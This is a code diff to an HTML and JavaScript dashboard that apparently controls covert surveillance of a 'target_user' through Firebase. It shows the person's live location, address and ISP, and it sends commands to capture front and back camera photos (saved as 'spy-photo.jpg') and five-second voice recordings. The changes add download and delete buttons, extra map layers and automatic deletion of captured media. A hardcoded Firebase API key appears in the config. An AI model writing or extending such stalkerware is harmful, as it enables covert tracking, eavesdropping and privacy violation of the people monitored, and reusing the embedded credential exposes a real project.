@@ -28,6 +28,10 @@
         .media-box { margin-top: 15px; border: 1px dashed #38bdf8; border-radius: 8px; padding: 8px; text-align: center; display: none; background: rgba(0,0,0,0.5);}
         .media-box img { max-width: 100%; border-radius: 5px; margin-top: 5px; }
         .media-box audio { width: 100%; margin-top: 5px; outline: none; }
+        
+        .media-controls { display: flex; justify-content: space-between; margin-top: 10px; gap: 5px; }
+        .media-controls a, .media-controls button { flex: 1; padding: 5px; font-size: 12px; text-decoration: none; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; text-align: center;}
+        .dl-btn { background: #10b981; color: white; } .del-btn { background: #ef4444; color: white; }
 
         .smart-marker { text-align: center; font-size: 35px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.5)); transition: transform 0.3s; }
         .hide-btn { background: transparent; border: 1px solid #ef4444; color: #ef4444; padding: 3px 8px; border-radius: 5px; cursor: pointer; font-size: 12px;}
@@ -61,18 +65,25 @@
             <button id="photoBackBtn" class="action-btn photo-btn">📸 Back Cam</button>
             <button id="audioBtn" class="action-btn audio-btn">🎙️ 5s Voice Record</button>
             <button id="ringBtn" class="action-btn ring-btn">🔔 Ring</button>
-            <button id="msgBtn" class="action-btn msg-btn">💬 Send Msg</button>
             <button id="geoBtn" class="action-btn geo-btn">🛡️ Geofence: OFF</button>
         </div>
 
         <div class="media-box" id="photoBox">
             <div id="photoStatus" style="font-size: 12px; color: #94a3b8;">Latest Snapshot</div>
             <img id="spyImg" src="" alt="">
+            <div class="media-controls" id="photoControls" style="display:none;">
+                <a id="downloadPhoto" class="dl-btn" download="spy-photo.jpg">💾 Download</a>
+                <button id="deletePhoto" class="del-btn">🗑️ Delete Data</button>
+            </div>
         </div>
 
         <div class="media-box" id="audioBox">
             <div id="audioStatus" style="font-size: 12px; color: #94a3b8;">Latest Voice Record</div>
             <audio id="spyAudio" controls></audio>
+            <div class="media-controls" id="audioControls" style="display:none;">
+                <a id="downloadAudio" class="dl-btn" download="spy-voice.webm">💾 Download</a>
+                <button id="deleteAudio" class="del-btn">🗑️ Delete Data</button>
+            </div>
         </div>
     </div>
 
@@ -81,53 +92,55 @@
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        import { getDatabase, ref, onValue, set, remove } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
         const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
         const app = initializeApp(firebaseConfig); const db = getDatabase(app);
 
-        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20 });
+        // Map Setup with Nature/Terrain Layer
+        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']});
+        const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 });
+        const terrainLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']}); // 'p' is for Terrain/Nature
+        
         const map = L.map('map', { layers: [satLayer] }).setView([23.8103, 90.4125], 6);
+        L.control.layers({"Satellite (স্যাটেলাইট)": satLayer, "Street (রাস্তা)": streetLayer, "Nature/Terrain (গাছপালা/প্রকৃতি)": terrainLayer}).addTo(map);
 
         let marker = null; let accuracyRadar = null; 
         let routeLine = L.polyline([], {color: '#ef4444', weight: 4, opacity: 0.8}).addTo(map);
         let lastLat = 0, lastLng = 0; let geofenceEnabled = false; let geofenceCircle = null; let geofenceCenter = null;
 
-        // Hide/Show logic
+        // Auto-delete on Page Refresh to save Firebase Quota
+        remove(ref(db, 'live_location/photo'));
+        remove(ref(db, 'live_location/audio'));
+
         document.getElementById('hidePanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').classList.add('hidden'); document.getElementById('showPanelBtn').style.display = 'block'; });
         document.getElementById('showPanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').classList.remove('hidden'); document.getElementById('showPanelBtn').style.display = 'none'; });
 
-        // Action Buttons
-        document.getElementById('msgBtn').addEventListener('click', () => { const msg = prompt("Enter msg:"); if(msg) set(ref(db, 'live_location/chat'), { message: msg, time: Date.now() }); });
         document.getElementById('ringBtn').addEventListener('click', () => { set(ref(db, 'live_location/command'), { ringTime: Date.now() }); });
         
-        // Photos (Front & Back)
         function reqPhoto(type) {
             set(ref(db, 'live_location/command'), { photoTime: Date.now(), camType: type }); 
-            document.getElementById('photoBox').style.display = 'block';
-            document.getElementById('photoStatus').innerText = `Requesting ${type} camera...`;
-            document.getElementById('photoStatus').style.color = "#f59e0b";
-            document.getElementById('spyImg').src = "";
+            document.getElementById('photoBox').style.display = 'block'; document.getElementById('photoControls').style.display = 'none';
+            document.getElementById('photoStatus').innerText = `Requesting ${type} camera...`; document.getElementById('photoStatus').style.color = "#f59e0b"; document.getElementById('spyImg').src = "";
         }
         document.getElementById('photoFrontBtn').addEventListener('click', () => reqPhoto("user"));
         document.getElementById('photoBackBtn').addEventListener('click', () => reqPhoto("environment"));
 
-        // Audio
         document.getElementById('audioBtn').addEventListener('click', () => { 
             set(ref(db, 'live_location/command'), { audioTime: Date.now() }); 
-            document.getElementById('audioBox').style.display = 'block';
-            document.getElementById('audioStatus').innerText = "Recording voice (5s)... Please wait.";
-            document.getElementById('audioStatus').style.color = "#f59e0b";
-            document.getElementById('spyAudio').src = "";
+            document.getElementById('audioBox').style.display = 'block'; document.getElementById('audioControls').style.display = 'none';
+            document.getElementById('audioStatus').innerText = "Recording voice (5s)..."; document.getElementById('audioStatus').style.color = "#f59e0b"; document.getElementById('spyAudio').src = "";
         });
 
-        // Geofence
+        // Delete Buttons
+        document.getElementById('deletePhoto').addEventListener('click', () => { remove(ref(db, 'live_location/photo')); document.getElementById('photoBox').style.display = 'none'; alert("Photo deleted from Database!"); });
+        document.getElementById('deleteAudio').addEventListener('click', () => { remove(ref(db, 'live_location/audio')); document.getElementById('audioBox').style.display = 'none'; alert("Audio deleted from Database!"); });
+
         document.getElementById('geoBtn').addEventListener('click', () => {
             geofenceEnabled = !geofenceEnabled;
             if(geofenceEnabled && lastLat !== 0) {
                 document.getElementById('geoBtn').innerText = "🛡️ Geofence: ON (200m)"; document.getElementById('geoBtn').style.background = "#10b981";
-                geofenceCenter = [lastLat, lastLng];
-                geofenceCircle = L.circle(geofenceCenter, { radius: 200, color: '#f59e0b', fillOpacity: 0.1, dashArray: '5, 5' }).addTo(map);
+                geofenceCenter = [lastLat, lastLng]; geofenceCircle = L.circle(geofenceCenter, { radius: 200, color: '#f59e0b', fillOpacity: 0.1 }).addTo(map);
             } else {
                 document.getElementById('geoBtn').innerText = "🛡️ Geofence: OFF"; document.getElementById('geoBtn').style.background = "#f59e0b";
                 if(geofenceCircle) map.removeLayer(geofenceCircle);
@@ -138,29 +151,30 @@
             fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`).then(res => res.json()).then(data => { document.getElementById('addressUI').innerText = `📍 ${data.display_name}`; }).catch(()=>{});
         }
 
-        // Listen for Photo
         onValue(ref(db, 'live_location/photo'), (snap) => {
             const data = snap.val();
             if (data && data.image) {
                 document.getElementById('photoStatus').innerText = "Successfully Captured!"; document.getElementById('photoStatus').style.color = "#10b981";
                 document.getElementById('spyImg').src = data.image;
+                document.getElementById('downloadPhoto').href = data.image;
+                document.getElementById('photoControls').style.display = 'flex';
             } else if (data && data.error) {
                 document.getElementById('photoStatus').innerText = `⚠️ Cam Error: ${data.error}`; document.getElementById('photoStatus').style.color = "#ef4444";
             }
         });
 
-        // Listen for Audio
         onValue(ref(db, 'live_location/audio'), (snap) => {
             const data = snap.val();
             if (data && data.file) {
                 document.getElementById('audioStatus').innerText = "Voice Received!"; document.getElementById('audioStatus').style.color = "#10b981";
                 document.getElementById('spyAudio').src = data.file;
+                document.getElementById('downloadAudio').href = data.file;
+                document.getElementById('audioControls').style.display = 'flex';
             } else if (data && data.error) {
                 document.getElementById('audioStatus').innerText = `⚠️ Mic Error: ${data.error}`; document.getElementById('audioStatus').style.color = "#ef4444";
             }
         });
 
-        // Listen for User Data
         onValue(ref(db, 'live_location/target_user'), (snapshot) => {
             const data = snapshot.val();
             if (data && data.isOnline) {
@@ -171,8 +185,7 @@
                 document.getElementById('ispUI').innerText = data.isp || "--";
 
                 if(data.status && data.status.includes("Error")) {
-                    document.getElementById('addressUI').innerText = `⚠️ ${data.status}`; document.getElementById('addressUI').style.borderLeftColor = "#ef4444";
-                    return; 
+                    document.getElementById('addressUI').innerText = `⚠️ ${data.status}`; document.getElementById('addressUI').style.borderLeftColor = "#ef4444"; return; 
                 }
 
                 document.getElementById('addressUI').style.borderLeftColor = "#10b981";
